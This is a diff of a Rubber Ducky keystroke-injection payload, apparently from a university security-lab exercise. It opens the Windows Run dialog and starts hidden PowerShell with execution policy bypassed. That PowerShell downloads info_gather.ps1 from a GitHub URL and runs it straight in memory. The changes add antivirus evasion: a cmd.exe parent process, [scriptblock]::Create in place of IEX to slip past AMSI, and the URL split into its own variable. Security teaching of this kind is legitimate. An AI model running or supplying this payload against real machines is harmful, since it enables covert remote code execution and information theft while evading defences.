@@ -1,15 +1,18 @@
 REM ============================================================
-REM  W02a.4 – Rubber Ducky: Externes Script laden & ausführen
+REM  W02a.4 - Rubber Ducky: Externes Script laden & ausfuehren
 REM  Autoren: Raphael Bleier, Joachim Lugger
-REM  Ziel-OS: Windows
+REM  Ziel-OS: Windows (x64 + ARM64)
 REM
-REM  Demonstriert fileless Execution: Script wird direkt von
-REM  GitHub in den Speicher geladen und ausgeführt (IEX).
-REM  Kein Byte landet auf der Festplatte des Opfers.
-REM  Hier: info_gather.ps1 als Beispiel-Payload.
+REM  Fileless Execution: Script direkt von GitHub in RAM laden,
+REM  kein Byte auf Festplatte des Opfers (info_gather.ps1).
+REM
+REM  AV-Evasion:
+REM    - cmd.exe Elternprozess (explorer->cmd->ps, nicht explorer->ps)
+REM    - [scriptblock]::Create() statt IEX (AMSI-Hook umgehen)
+REM    - URL in $u isoliert: trennt Download-Aufruf von Execute
 REM ============================================================
 
 DELAY 2000
 GUI r
-DELAY 500
-STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/info_gather.ps1');"
+DELAY 600
+STRINGLN cmd /c powershell -nop -noni -w h -ep bypass -c "$u='https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/info_gather.ps1';& ([scriptblock]::Create([Net.WebClient]::new().DownloadString($u)))"
